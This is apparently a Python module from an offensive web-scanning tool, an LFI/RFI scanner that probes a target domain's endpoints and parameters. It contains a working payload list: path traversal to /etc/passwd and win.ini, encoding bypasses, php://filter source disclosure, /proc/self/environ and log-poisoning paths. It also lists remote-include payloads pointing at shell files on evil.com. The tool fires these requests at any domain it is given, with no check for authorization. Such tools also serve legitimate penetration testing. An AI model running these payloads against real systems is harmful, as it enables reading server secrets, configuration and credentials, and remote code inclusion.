"""
Trace Foundry V5 - LFI / RFI Scanner
php://filter, encoding bypass, path traversal, /proc/self/environ
"""
import urllib.request
import urllib.error
import urllib.parse
import re
from utils.display import section, ok, warn, info, bug_found

LFI_PAYLOADS = [
    # Basic traversal
    ("../etc/passwd",                           "root:x:"),
    ("../../etc/passwd",                        "root:x:"),
    ("../../../etc/passwd",                     "root:x:"),
    ("../../../../etc/passwd",                  "root:x:"),
    ("../../../../../etc/passwd",               "root:x:"),
    ("../../../../../../etc/passwd",            "root:x:"),
    ("../../../../../../../etc/passwd",         "root:x:"),
    # Null byte (old PHP)
    ("../etc/passwd%00",                        "root:x:"),
    # URL encoded
    ("%2e%2e%2fetc%2fpasswd",                   "root:x:"),
    ("%2e%2e/%2e%2e/etc/passwd",                "root:x:"),
    # Double encoded
    ("%252e%252e%252fetc%252fpasswd",           "root:x:"),
    # php://filter
    ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
    ("php://filter/read=convert.base64-encode/resource=../config.php", "PD9waHA"),
    # /proc/self
    ("/proc/self/environ",                      "HTTP_"),
    ("/proc/self/cmdline",                      "php"),
    # Windows
    ("..\\windows\\win.ini",                    "[fonts]"),
    ("..%5cwindows%5cwin.ini",                  "[fonts]"),
    ("../../../../windows/win.ini",             "[fonts]"),
    # Log poisoning target
    ("/var/log/apache2/access.log",             "GET /"),
    ("/var/log/nginx/access.log",               "GET /"),
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.php",
    "//evil.com/shell.txt",
]

LFI_PARAMS = [
    "file","page","include","path","template","view","load",
    "read","document","folder","root","dir","pg","style",
    "pdf","layout","mod","conf","content","module","inc",
    "lang","language","locale","theme","skin","data",
]

class LFIModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout
        self.headers = {"User-Agent": "Mozilla/5.0"}

    def _fetch(self, url):
        try:
            req = urllib.request.Request(url, headers=self.headers)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(32768).decode("utf-8", errors="ignore")
                return body, r.status
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code
        except:
            return "", 0

    def _test_lfi(self, base_url, param):
        bugs = []
        for payload, indicator in LFI_PAYLOADS:
            enc = urllib.parse.quote(payload, safe="")
            url = f"{base_url}?{param}={enc}"
            body, status = self._fetch(url)
            if not body:
                continue

            if indicator.lower() in body.lower():
                technique = "php://filter" if "php://" in payload else \
                            "Path Traversal" if ".." in payload else \
                            "/proc/self" if "/proc" in payload else "LFI"
                bugs.append({
                    "type":     f"LFI — {technique}",
                    "severity": "CRITICAL",
                    "url":      url,
                    "param":    param,
                    "payload":  payload,
                    "evidence": f"Indicator '{indicator}' found in response",
                    "impact":   "Attacker can read arbitrary server files — /etc/passwd, configs, keys",
                })
                break

        return bugs

    def run(self):
        section("LFI / RFI Scanner (php://filter | Path Traversal | /proc)")
        all_bugs = []

        test_endpoints = ["/","/index.php","/page.php","/view.php",
                          "/load.php","/template.php","/include.php",
                          "/api/file","/api/v1/file","/download"]

        for endpoint in test_endpoints:
            for scheme in ["https","http"]:
                base_url = f"{scheme}://{self.domain}{endpoint}"
                _, status = self._fetch(base_url)
                if status == 0:
                    continue

                info(f"LFI testing: {base_url}")
                for param in LFI_PARAMS[:10]:
                    bugs = self._test_lfi(base_url, param)
                    for b in bugs:
                        bug_found(b["type"], b["severity"], {
                            "URL":      b["url"],
                            "Param":    b["param"],
                            "Payload":  b["payload"],
                            "Evidence": b["evidence"],
                            "Impact":   b["impact"],
                        })
                    all_bugs.extend(bugs)
                break

        info(f"LFI scan done — {len(all_bugs)} confirmed")
        if not all_bugs:
            ok("No LFI/RFI found ✓")
        return {"bugs": all_bugs}
